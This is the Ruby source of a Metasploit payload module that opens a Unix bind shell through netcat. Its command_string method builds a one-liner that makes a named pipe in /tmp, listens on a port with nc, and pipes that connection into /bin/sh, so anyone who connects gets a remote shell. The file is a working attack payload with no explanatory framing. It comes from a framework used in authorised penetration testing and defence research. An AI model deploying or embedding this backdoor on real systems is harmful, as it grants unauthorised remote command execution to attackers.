##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit4
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::BindTcp'

  #
  # Methods
  #

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Bind TCP (via netcat)',
      'Description'   => 'Listen for a connection and spawn a command shell via netcat',
      'Author'         =>
        [
          'm-1-k-3',
          'egypt',
          'juan vazquez'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'UNIX',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'netcat',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
    "mknod /tmp/#{backpipe} p; (nc -l -p #{datastore['LPORT']} ||nc -l #{datastore['LPORT']})0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
  end

end
